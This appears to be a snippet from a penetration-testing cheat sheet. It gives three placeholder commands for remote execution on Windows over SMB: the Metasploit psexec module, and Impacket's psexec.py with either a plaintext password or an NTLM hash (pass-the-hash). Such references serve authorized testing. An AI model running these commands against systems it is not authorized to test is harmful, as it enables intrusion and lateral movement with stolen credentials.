```exploit-smb-psexec
use exploit/windows/smb/psexec
```

```psexec-pass
psexec.py <Domain>/<User>:'<PASS>'@<Target-IP>
```

```psexec-hash
psexec.py <DOMAIN>/<User>@<Target-IP> -hashes <NTLMv2-Hash>
```
